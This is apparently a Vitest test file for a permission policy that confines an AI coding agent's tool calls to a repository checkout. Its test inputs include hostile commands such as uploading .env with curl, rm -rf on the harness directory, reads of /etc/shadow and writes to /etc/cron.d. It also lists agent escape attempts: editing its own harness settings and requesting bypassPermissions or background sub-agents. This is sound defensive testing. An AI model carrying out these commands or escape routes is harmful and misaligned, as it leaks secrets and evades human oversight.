import { SECURITY_TRACE_ERRORS } from '@auto-swe/shared/lib/scannerCache';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const { checkSensitiveFilePath, scanShellCommand } = vi.hoisted(() => ({
  checkSensitiveFilePath: vi.fn(async (_p: string): Promise<string | null> => null),
  scanShellCommand: vi.fn(async (_c: string): Promise<string | null> => null),
}));

vi.mock('../../lib/sensitiveFileScanner.js', () => ({ checkSensitiveFilePath }));
vi.mock('../../lib/shellCommandScanner.js', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../../lib/shellCommandScanner.js')>()),
  scanShellCommand,
}));

import {
  BROWSER_RELAYED_TOOL_NAMES,
  decideToolCall,
  HARNESS_TOOLS,
  harnessToolsFor,
  harnessToolsGranting,
  type PolicyContext,
  relayedToolName,
  toolsWithPause,
  toolsWithProfile,
} from './policy.js';

const ctx: PolicyContext = {
  containerId: 'workspace-abc',
  cwd: '/workspace/target-repo',
  home: '/workspace/.harness/home',
  projectConfigLoaded: true,
  tools: [...HARNESS_TOOLS],
};
const REPO = '/workspace/target-repo';

const AWS_KEY = 'AKIAABCDEFGHIJKLMNOP';

beforeEach(() => {
  vi.clearAllMocks();
  checkSensitiveFilePath.mockResolvedValue(null);
  scanShellCommand.mockResolvedValue(null);
});

describe('the tool allowlist', () => {
  it('allows the worker-owned knowledge tool only when its binding is in the policy context', async () => {
    const name = 'mcp__knowledge__searchKnowledge';
    await expect(decideToolCall(name, { query: 'parser' }, ctx)).resolves.toMatchObject({
      allow: false,
    });
    await expect(
      decideToolCall(name, { query: 'parser' }, { ...ctx, mcpTools: [name] })
    ).resolves.toEqual({ allow: true });
    await expect(
      decideToolCall('mcp__knowledge__submitLearning', {}, { ...ctx, mcpTools: [name] })
    ).resolves.toMatchObject({ allow: false });
  });
  it('names the same capability as the four Mastra workspace tools', () => {
    expect([...HARNESS_TOOLS].sort()).toEqual(['Bash', 'Edit', 'Glob', 'Grep', 'Read', 'Write']);
  });

  it('refuses a tool outside it', async () => {
    for (const tool of [
      'WebFetch',
      'Task',
      'Skill',
      'mcp__repo__delete',
      'DeferredToolPlaceholder',
    ]) {
      const verdict = await decideToolCall(tool, {}, ctx);
      expect(verdict).toMatchObject({ allow: false });
    }
  });
});

describe('the question tool', () => {
  const paused = { ...ctx, tools: toolsWithPause(ctx.tools, true) };

  it('is offered only to a run that can pause', () => {
    expect(toolsWithPause(ctx.tools, true)).toEqual([...HARNESS_TOOLS, 'AskUserQuestion']);
    expect(toolsWithPause(ctx.tools, false)).toEqual([...HARNESS_TOOLS]);
    expect(toolsWithPause(ctx.tools, undefined)).toEqual([...HARNESS_TOOLS]);
  });

  it('is refused as before when the run cannot pause', async () => {
    await expect(decideToolCall('AskUserQuestion', { questions: [] }, ctx)).resolves.toEqual({
      allow: false,
      reason: 'The AskUserQuestion tool is not available in this workspace.',
    });
  });

  it('reaches the runtime’s hook when the run can pause', async () => {
    await expect(decideToolCall('AskUserQuestion', { questions: [] }, paused)).resolves.toEqual({
      allow: true,
    });
  });

  it('does not widen anything else', async () => {
    await expect(decideToolCall('WebFetch', {}, paused)).resolves.toMatchObject({ allow: false });
    await expect(decideToolCall('Skill', {}, paused)).resolves.toMatchObject({ allow: false });
  });
});

describe('relayed MCP tools', () => {
  it('allows exactly the tools the worker relays, by their harness names', async () => {
    const withMcp = { ...ctx, mcpTools: [relayedToolName('search')] };
    await expect(
      decideToolCall('mcp__connection__search', { q: 'x' }, withMcp)
    ).resolves.toMatchObject({ allow: true });
    // Another server's tool, or one the connection did not offer, is still refused.
    await expect(decideToolCall('mcp__connection__delete', {}, withMcp)).resolves.toMatchObject({
      allow: false,
    });
    await expect(decideToolCall('mcp__repo__search', {}, withMcp)).resolves.toMatchObject({
      allow: false,
    });
    // Without a relay, no MCP tool is allowed.
    await expect(decideToolCall('mcp__connection__search', {}, ctx)).resolves.toMatchObject({
      allow: false,
    });
  });
});

describe('explicit browser tools', () => {
  it('allows exactly the in-process browser server tool names', async () => {
    const withBrowser = { ...ctx, browserTools: BROWSER_RELAYED_TOOL_NAMES };
    await expect(
      decideToolCall('mcp__browser__browser_navigate', { url: 'http://localhost' }, withBrowser)
    ).resolves.toMatchObject({ allow: true });
    await expect(
      decideToolCall('mcp__browser__browser_secret', {}, withBrowser)
    ).resolves.toMatchObject({ allow: false });
    await expect(decideToolCall('mcp__browser__browser_navigate', {}, ctx)).resolves.toMatchObject({
      allow: false,
    });
  });
});

describe('an exact grant (harnessToolsGranting)', () => {
  it('maps exactly the named workspace tools, and an empty grant to no tools', () => {
    expect(harnessToolsGranting([])).toEqual([]);
    expect(harnessToolsGranting(['mcp'])).toEqual([]);
    expect(harnessToolsGranting(['readFile', 'listDirectory'])).toEqual(['Read', 'Glob', 'Grep']);
    expect(harnessToolsGranting(['bash'])).toEqual(['Bash']);
  });
});

describe('the Agent’s toolKeys', () => {
  it('grant every tool when unset, empty, or naming no workspace tool, as the Mastra implementer does', () => {
    for (const keys of [null, undefined, [], ['mcp']]) {
      expect(harnessToolsFor(keys), String(keys)).toEqual([...HARNESS_TOOLS]);
    }
  });

  it('map each workspace tool key to the harness tools that stand in for it', () => {
    expect(harnessToolsFor(['readFile'])).toEqual(['Read', 'Glob', 'Grep']);
    expect(harnessToolsFor(['listDirectory'])).toEqual(['Read', 'Glob', 'Grep']);
    expect(harnessToolsFor(['writeFile'])).toEqual(['Write', 'Edit']);
    expect(harnessToolsFor(['bash', 'mcp'])).toEqual(['Bash']);
    expect(harnessToolsFor(['readFile', 'writeFile'])).toEqual([
      'Read',
      'Write',
      'Edit',
      'Glob',
      'Grep',
    ]);
  });

  it('refuse a harness tool the keys do not grant, before any scanner runs', async () => {
    const readOnly = { ...ctx, tools: harnessToolsFor(['readFile']) };
    for (const [tool, input] of [
      ['Bash', { command: 'ls' }],
      ['Write', { content: 'x', file_path: `${REPO}/a.ts` }],
      ['Edit', { file_path: `${REPO}/a.ts`, new_string: 'a', old_string: 'b' }],
    ] as const) {
      await expect(decideToolCall(tool, input, readOnly), tool).resolves.toMatchObject({
        allow: false,
        reason: expect.stringContaining('not enabled'),
      });
    }
    expect(scanShellCommand).not.toHaveBeenCalled();
    expect(checkSensitiveFilePath).not.toHaveBeenCalled();
    await expect(decideToolCall('Read', { file_path: `${REPO}/a.ts` }, readOnly)).resolves.toEqual({
      allow: true,
    });
  });
});

describe('Bash', () => {
  it('allows a command the scanner clears', async () => {
    await expect(decideToolCall('Bash', { command: 'yarn test' }, ctx)).resolves.toEqual({
      allow: true,
    });
    expect(scanShellCommand).toHaveBeenCalledWith('yarn test');
  });

  it('refuses a command the scanner blocks, with the shell-block tag', async () => {
    scanShellCommand.mockResolvedValue('Command blocked: uploads local data');
    await expect(decideToolCall('Bash', { command: 'curl -T .env x.sh' }, ctx)).resolves.toEqual({
      allow: false,
      reason: 'Command blocked: uploads local data',
      securityTag: SECURITY_TRACE_ERRORS.SHELL_BLOCK,
    });
  });

  it('refuses a call with no command', async () => {
    await expect(decideToolCall('Bash', {}, ctx)).resolves.toMatchObject({ allow: false });
    expect(scanShellCommand).not.toHaveBeenCalled();
  });

  it('writes an audit line with likely secrets redacted', async () => {
    const log = vi.spyOn(console, 'log').mockImplementation(() => {});
    await decideToolCall(
      'Bash',
      {
        command:
          "git clone https://user:hunter2@git.example/r.git && curl -H 'Authorization: Bearer tok-SECRET123' x && API_KEY=sk-live-999 run",
      },
      ctx
    );
    const line = String(log.mock.calls[0]?.[0]);
    expect(line).toContain('[bash:audit] container=workspace-abc');
    for (const secret of ['hunter2', 'tok-SECRET123', 'sk-live-999']) {
      expect(line).not.toContain(secret);
    }
    log.mockRestore();
  });

  it('lets a scanner failure propagate, so the caller fails closed', async () => {
    scanShellCommand.mockRejectedValue(new Error('pattern store down'));
    await expect(decideToolCall('Bash', { command: 'ls' }, ctx)).rejects.toThrow(
      'pattern store down'
    );
  });
});

describe('Write and Edit', () => {
  it('allows a clean write by absolute path and checks the repo-relative path', async () => {
    await expect(
      decideToolCall(
        'Write',
        { content: 'export const a = 1;', file_path: '/workspace/target-repo/src/a.ts' },
        ctx
      )
    ).resolves.toEqual({ allow: true });
    expect(checkSensitiveFilePath).toHaveBeenCalledWith('src/a.ts');
  });

  it('refuses a relative path, which the harness would resolve against wherever a cd left it', async () => {
    // `cd .git` in an earlier Bash call, then this: the harness writes .git/hooks/pre-push.
    for (const harnessCwd of [REPO, `${REPO}/.git`]) {
      await expect(
        decideToolCall('Write', { content: 'x', file_path: 'hooks/pre-push' }, ctx, harnessCwd)
      ).resolves.toMatchObject({ allow: false, reason: expect.stringContaining('absolute') });
    }
    expect(checkSensitiveFilePath).not.toHaveBeenCalled();
  });

  it('refuses a path outside the checkout, however it is spelled', async () => {
    for (const file_path of [
      '/etc/passwd',
      '../outside.txt',
      'src/a.ts',
      '/workspace/target-repo/../.harness/claude',
      '/workspace/target-repo',
      '',
    ]) {
      const verdict = await decideToolCall('Write', { content: 'x', file_path }, ctx);
      expect(verdict, file_path).toMatchObject({ allow: false });
    }
    expect(checkSensitiveFilePath).not.toHaveBeenCalled();
  });

  it('refuses a sensitive path with the file-block tag', async () => {
    checkSensitiveFilePath.mockResolvedValue('Blocked: .env files are sensitive');
    await expect(
      decideToolCall('Write', { content: 'K=v', file_path: `${REPO}/.env` }, ctx)
    ).resolves.toEqual({
      allow: false,
      reason: 'Blocked: .env files are sensitive',
      securityTag: SECURITY_TRACE_ERRORS.FILE_BLOCK,
    });
  });

  it('refuses CRITICAL content with the content-block tag', async () => {
    const verdict = await decideToolCall(
      'Write',
      { content: `const key = '${AWS_KEY}';`, file_path: `${REPO}/src/a.ts` },
      ctx
    );
    expect(verdict).toMatchObject({
      allow: false,
      securityTag: SECURITY_TRACE_ERRORS.CONTENT_BLOCK,
    });
    expect((verdict as { reason: string }).reason).toContain('HARDCODED_AWS_KEY');
  });

  it('allows a warning-level finding but hands the model the warning, tagged', async () => {
    const verdict = await decideToolCall(
      'Write',
      { content: "createHash('md5')", file_path: `${REPO}/src/a.ts` },
      ctx
    );
    expect(verdict).toMatchObject({
      allow: true,
      securityTag: SECURITY_TRACE_ERRORS.CONTENT_WARN,
    });
    expect((verdict as { warning: string }).warning).toContain('INSECURE_CRYPTO');
  });

  it('does not scan test files for content, as the Mastra write tool does not', async () => {
    await expect(
      decideToolCall('Write', { content: AWS_KEY, file_path: `${REPO}/src/a.test.ts` }, ctx)
    ).resolves.toEqual({ allow: true });
  });

  it('checks an Edit by the text it inserts', async () => {
    await expect(
      decideToolCall(
        'Edit',
        { file_path: `${REPO}/src/a.ts`, new_string: `k = '${AWS_KEY}'`, old_string: 'k = 1' },
        ctx
      )
    ).resolves.toMatchObject({ allow: false, securityTag: SECURITY_TRACE_ERRORS.CONTENT_BLOCK });
    await expect(
      decideToolCall(
        'Edit',
        { file_path: `${REPO}/src/a.ts`, new_string: 'k = 2', old_string: AWS_KEY },
        ctx
      )
    ).resolves.toEqual({ allow: true });
  });

  it('applies the sensitive-path check to Edit as well', async () => {
    checkSensitiveFilePath.mockResolvedValue('Blocked');
    await expect(
      decideToolCall('Edit', { file_path: `${REPO}/.env`, new_string: 'a', old_string: 'b' }, ctx)
    ).resolves.toMatchObject({ allow: false, securityTag: SECURITY_TRACE_ERRORS.FILE_BLOCK });
  });

  it('refuses a change to the harness configuration it loads on the next turn', async () => {
    for (const rel of [
      '.claude/settings.json',
      '.claude/hooks/x.sh',
      'pkg/.claude/settings.local.json',
      'CLAUDE.md',
      'docs/CLAUDE.md',
      'CLAUDE.local.md',
      'claude.md',
      '.mcp.json',
    ]) {
      for (const tool of ['Write', 'Edit'] as const) {
        const verdict = await decideToolCall(
          tool,
          { content: 'x', file_path: `${REPO}/${rel}`, new_string: 'x', old_string: 'y' },
          ctx
        );
        expect(verdict, `${tool} ${rel}`).toMatchObject({ allow: false });
      }
    }
    // Lookalikes are ordinary files.
    for (const rel of ['docs/claude-md.txt', 'pkg/.mcp.json', '.claudeignore']) {
      await expect(
        decideToolCall('Write', { content: 'x', file_path: `${REPO}/${rel}` }, ctx),
        rel
      ).resolves.toEqual({ allow: true });
    }
  });

  it('leaves that configuration editable when the run does not load it', async () => {
    await expect(
      decideToolCall(
        'Write',
        { content: '# Notes', file_path: `${REPO}/CLAUDE.md` },
        { ...ctx, projectConfigLoaded: false }
      )
    ).resolves.toEqual({ allow: true });
  });
});

describe('Read, Glob and Grep', () => {
  it('reads inside the checkout and the harness’s own .claude directory only', async () => {
    const reads = [
      ['/workspace/target-repo/src/a.ts', true],
      ['src/a.ts', false],
      ['/workspace/.harness/home/.claude/projects/x/tool-results/1.txt', true],
      // Where an oversized system prompt is staged for the harness to read.
      ['/workspace/.harness/home/.claude/system-prompt.md', true],
      ['/workspace/.harness/system-prompt.md', false],
      ['/etc/passwd', false],
      ['/workspace/.harness/claude', false],
      ['../../etc/shadow', false],
    ] as const;
    for (const [file_path, allowed] of reads) {
      const verdict = await decideToolCall('Read', { file_path }, ctx, REPO);
      expect(verdict.allow, file_path).toBe(allowed);
    }
    await expect(decideToolCall('Read', {}, ctx, REPO)).resolves.toMatchObject({ allow: false });
  });

  it('searches from the harness’s current directory only while it is inside the checkout', async () => {
    for (const harnessCwd of [REPO, `${REPO}/src`]) {
      await expect(
        decideToolCall('Grep', { pattern: 'TODO' }, ctx, harnessCwd),
        harnessCwd
      ).resolves.toEqual({ allow: true });
    }
    for (const harnessCwd of ['/', '/workspace', 'src', undefined]) {
      await expect(
        decideToolCall('Glob', { pattern: '*' }, ctx, harnessCwd),
        String(harnessCwd)
      ).resolves.toMatchObject({ allow: false });
    }
  });

  it('refuses a search path that is relative or outside the checkout', async () => {
    await expect(
      decideToolCall('Grep', { path: `${REPO}/src`, pattern: 'x' }, ctx, REPO)
    ).resolves.toEqual({ allow: true });
    await expect(
      decideToolCall('Grep', { path: 'src', pattern: 'x' }, ctx, REPO)
    ).resolves.toMatchObject({ allow: false });
    await expect(
      decideToolCall('Grep', { path: '/etc', pattern: 'x' }, ctx)
    ).resolves.toMatchObject({ allow: false });
    await expect(
      decideToolCall('Glob', { path: '/', pattern: '*.ts' }, ctx)
    ).resolves.toMatchObject({ allow: false });
  });

  it('refuses a glob that would walk out of the directory it is rooted in', async () => {
    for (const pattern of ['/etc/*', '../**/*.ts', 'src/../../**']) {
      await expect(decideToolCall('Glob', { pattern }, ctx, REPO), pattern).resolves.toMatchObject({
        allow: false,
      });
    }
    await expect(decideToolCall('Glob', { pattern: 'src/**/*.ts' }, ctx, REPO)).resolves.toEqual({
      allow: true,
    });
    await expect(
      decideToolCall('Grep', { glob: '/etc/*', pattern: 'x' }, ctx)
    ).resolves.toMatchObject({ allow: false });
  });
});

describe('tools a profile grants', () => {
  const PROFILE_DIR = '/workspace/.harness/profiles/0123456789ab';
  const granted: PolicyContext = {
    ...ctx,
    profileDir: PROFILE_DIR,
    profileSkills: new Set(['kit:hello', 'kit:ops:restart']),
    tools: toolsWithProfile(HARNESS_TOOLS, ['Skill', 'Agent']),
  };
  const subAgent = { description: 'd', prompt: 'x', run_in_background: false };

  it('adds exactly Skill and Agent, and nothing a manifest could smuggle in', () => {
    expect(toolsWithProfile(HARNESS_TOOLS, undefined)).toEqual([...HARNESS_TOOLS]);
    expect(toolsWithProfile(HARNESS_TOOLS, ['Skill'])).toEqual([...HARNESS_TOOLS, 'Skill']);
    expect(toolsWithProfile(['Read'], ['Agent', 'Skill', 'WebFetch', 'Bash', 'WebSearch'])).toEqual(
      ['Read', 'Skill', 'Agent']
    );
  });

  it('allows Skill and Agent only when granted', async () => {
    for (const [tool, input] of [
      ['Skill', { skill: 'kit:hello' }],
      ['Agent', subAgent],
    ] as const) {
      await expect(decideToolCall(tool, input, ctx), tool).resolves.toMatchObject({
        allow: false,
      });
      await expect(decideToolCall(tool, input, granted), tool).resolves.toEqual({ allow: true });
    }
    await expect(
      decideToolCall(
        'Skill',
        { skill: 'kit:hello' },
        { ...granted, tools: toolsWithProfile(HARNESS_TOOLS, ['Agent']) }
      )
    ).resolves.toMatchObject({ allow: false });
  });

  it('allows Skill only for a skill or command the profile declares, plugin-qualified', async () => {
    for (const skill of ['kit:hello', 'kit:ops:restart']) {
      await expect(decideToolCall('Skill', { args: 'x', skill }, granted), skill).resolves.toEqual({
        allow: true,
      });
    }
    for (const input of [
      {},
      { skill: 42 },
      { skill: '' },
      // Bare spelling: a repository's own skill or command could answer to it.
      { skill: 'hello' },
      { skill: '/hello' },
      { skill: 'kit:hello ' },
      { skill: 'KIT:hello' },
      // Repository commands, bundled skills, other plugins.
      { skill: 'x' },
      { skill: 'project:x' },
      { skill: 'init' },
      { skill: 'review' },
      { skill: 'other:hello' },
    ]) {
      await expect(
        decideToolCall('Skill', input, granted),
        JSON.stringify(input)
      ).resolves.toMatchObject({ allow: false });
    }
    // A context that names no skills allows none.
    await expect(
      decideToolCall('Skill', { skill: 'kit:hello' }, { ...granted, profileSkills: undefined })
    ).resolves.toMatchObject({ allow: false });
  });

  it('never allows WebFetch, WebSearch or Task, whoever asks and whatever is granted', async () => {
    for (const tool of ['WebFetch', 'WebSearch', 'Task', 'NotebookEdit', 'TodoWrite']) {
      await expect(
        decideToolCall(tool, { url: 'https://example.com' }, granted),
        tool
      ).resolves.toMatchObject({ allow: false });
    }
    // A tool smuggled into the context's own list is still not a harness or profile tool.
    await expect(
      decideToolCall('WebFetch', {}, { ...granted, tools: [...granted.tools, 'WebFetch' as never] })
    ).resolves.toMatchObject({ allow: false });
  });

  it('refuses a sub-agent that asks for isolation or a looser permission mode', async () => {
    for (const input of [
      { isolation: 'remote', prompt: 'x' },
      { isolation: 'worktree', prompt: 'x' },
      { mode: 'bypassPermissions', prompt: 'x' },
      { mode: 'acceptEdits', prompt: 'x' },
    ].map((input) => ({ ...subAgent, ...input }))) {
      await expect(
        decideToolCall('Agent', input, granted),
        JSON.stringify(input)
      ).resolves.toMatchObject({ allow: false });
    }
    await expect(
      decideToolCall('Agent', { ...subAgent, mode: 'default', subagent_type: 'reviewer' }, granted)
    ).resolves.toEqual({ allow: true });
  });

  it('refuses a sub-agent that overrides the model, names itself or runs in the background', async () => {
    for (const input of [
      { ...subAgent, model: 'opus' },
      { ...subAgent, model: 'fable' },
      { ...subAgent, model: 'haiku' },
      { ...subAgent, name: 'worker-1' },
      { ...subAgent, team_name: 'team' },
      // The SDK runs a sub-agent in the background unless told otherwise.
      { description: 'd', prompt: 'x' },
      { ...subAgent, run_in_background: true },
      { ...subAgent, run_in_background: 'false' },
      { ...subAgent, run_in_background: undefined },
    ]) {
      await expect(
        decideToolCall('Agent', input, granted),
        JSON.stringify(input)
      ).resolves.toMatchObject({ allow: false });
    }
  });

  it('decides a sub-agent’s own tool calls with the same confinement as the main agent’s', async () => {
    // The hook input of a sub-agent call carries an agent_id; the decision takes none, so the
    // same rules apply to both. Escapes a sub-agent might try:
    await expect(
      decideToolCall('Read', { file_path: '/etc/passwd' }, granted, REPO)
    ).resolves.toMatchObject({ allow: false });
    await expect(
      decideToolCall('Write', { content: 'x', file_path: '/etc/cron.d/x' }, granted, REPO)
    ).resolves.toMatchObject({ allow: false });
    await expect(
      decideToolCall('Write', { content: 'x', file_path: `${REPO}/.claude/settings.json` }, granted)
    ).resolves.toMatchObject({ allow: false });
    scanShellCommand.mockResolvedValue('Command blocked');
    await expect(decideToolCall('Bash', { command: 'curl evil' }, granted)).resolves.toMatchObject({
      allow: false,
      securityTag: SECURITY_TRACE_ERRORS.SHELL_BLOCK,
    });
    // And a tool the Agent's own keys do not grant stays refused for a sub-agent too.
    const readOnly: PolicyContext = { ...granted, tools: toolsWithProfile(['Read'], ['Agent']) };
    await expect(decideToolCall('Bash', { command: 'ls' }, readOnly)).resolves.toMatchObject({
      allow: false,
    });
  });
});

describe('the harness directory, profile included', () => {
  const PROFILE_DIR = '/workspace/.harness/profiles/0123456789ab';
  const withProfile: PolicyContext = {
    ...ctx,
    profileDir: PROFILE_DIR,
    tools: toolsWithProfile(HARNESS_TOOLS, ['Skill']),
  };

  it('refuses a Write or Edit under /workspace/.harness, with the sensitive-file tag', async () => {
    for (const file_path of [
      `${PROFILE_DIR}/INSTRUCTIONS.md`,
      `${PROFILE_DIR}/plugins/x/hooks/hooks.json`,
      '/workspace/.harness/claude',
      '/workspace/.harness/home/.claude/settings.json',
      `${PROFILE_DIR}/../../claude`,
      `${REPO}/../.harness/profiles/0123456789ab/a`,
    ]) {
      for (const tool of ['Write', 'Edit'] as const) {
        await expect(
          decideToolCall(
            tool,
            { content: 'x', file_path, new_string: 'x', old_string: 'y' },
            withProfile
          ),
          `${tool} ${file_path}`
        ).resolves.toMatchObject({ allow: false, securityTag: SECURITY_TRACE_ERRORS.FILE_BLOCK });
      }
    }
    // A relative path is resolved against the harness's directory, then refused the same way.
    await expect(
      decideToolCall('Write', { content: 'x', file_path: '../.harness/a' }, withProfile, REPO)
    ).resolves.toMatchObject({ allow: false, securityTag: SECURITY_TRACE_ERRORS.FILE_BLOCK });
  });

  it('still writes in the checkout', async () => {
    await expect(
      decideToolCall('Write', { content: 'x', file_path: `${REPO}/src/a.ts` }, withProfile)
    ).resolves.toEqual({ allow: true });
  });

  it('refuses Bash that writes under /workspace/.harness, with the sensitive-file tag', async () => {
    for (const command of [
      `echo hi > ${PROFILE_DIR}/INSTRUCTIONS.md`,
      `echo hi >> '${PROFILE_DIR}/INSTRUCTIONS.md'`,
      `cat x | tee ${PROFILE_DIR}/a`,
      `cp evil.sh ${PROFILE_DIR}/plugins/x/scripts/run.sh`,
      `mv a /workspace/.harness/claude`,
      `dd if=/dev/zero of=${PROFILE_DIR}/f`,
      `rm -rf ${PROFILE_DIR}`,
      `chmod 777 ${PROFILE_DIR}/plugins`,
      `sed -i s/a/b/ ${PROFILE_DIR}/INSTRUCTIONS.md`,
      `cd /workspace && rm -rf .harness`,
      `cd ${PROFILE_DIR} && echo x > INSTRUCTIONS.md`,
      `python3 -c "open('/workspace/.harness/profiles/0123456789ab/a','w')"`,
      'echo x > ~/x',
      'echo x > "$HOME/../a" # .harness',
      `echo hi > ${REPO}/../.harness/a`,
    ]) {
      await expect(
        decideToolCall('Bash', { command }, withProfile, REPO),
        command
      ).resolves.toMatchObject({ allow: false, securityTag: SECURITY_TRACE_ERRORS.FILE_BLOCK });
    }
    // A relative redirect from a call made inside the harness directory.
    await expect(
      decideToolCall('Bash', { command: 'echo x > a' }, withProfile, PROFILE_DIR)
    ).resolves.toMatchObject({ allow: false, securityTag: SECURITY_TRACE_ERRORS.FILE_BLOCK });
  });

  it('lets Bash read the profile and write in the checkout', async () => {
    for (const command of [
      `cat ${PROFILE_DIR}/INSTRUCTIONS.md`,
      `ls -la /workspace/.harness/profiles && grep -r todo ${PROFILE_DIR}`,
      `echo ok > ${REPO}/out.txt`,
      `cp ${PROFILE_DIR}/plugins/x/template.md ${REPO}/docs/t.md`,
    ]) {
      // `cp from-profile to-checkout` writes to the checkout, but names .harness: the tripwire is
      // deliberately conservative about commands that both name it and change files.
      const verdict = await decideToolCall('Bash', { command }, withProfile, REPO);
      if (command.startsWith('cp ')) {
        expect(verdict.allow, command).toBe(false);
      } else {
        expect(verdict, command).toEqual({ allow: true });
      }
    }
  });

  it('allows reading the profile directory, and no other part of the harness directory', async () => {
    const reads = [
      [`${PROFILE_DIR}/plugins/x/skills/y/SKILL.md`, true],
      [PROFILE_DIR, true],
      ['/workspace/.harness/profiles/ffffffffffff/a', false],
      ['/workspace/.harness/profiles', false],
      [`${PROFILE_DIR}/../../claude`, false],
      ['/workspace/.harness/claude', false],
    ] as const;
    for (const [file_path, allowed] of reads) {
      const verdict = await decideToolCall('Read', { file_path }, withProfile, REPO);
      expect(verdict.allow, file_path).toBe(allowed);
    }
    await expect(
      decideToolCall('Grep', { path: PROFILE_DIR, pattern: 'x' }, withProfile, REPO)
    ).resolves.toEqual({ allow: true });
    // Without a bound profile, nothing under the profiles directory is readable.
    await expect(
      decideToolCall('Read', { file_path: `${PROFILE_DIR}/INSTRUCTIONS.md` }, ctx, REPO)
    ).resolves.toMatchObject({ allow: false });
  });
});
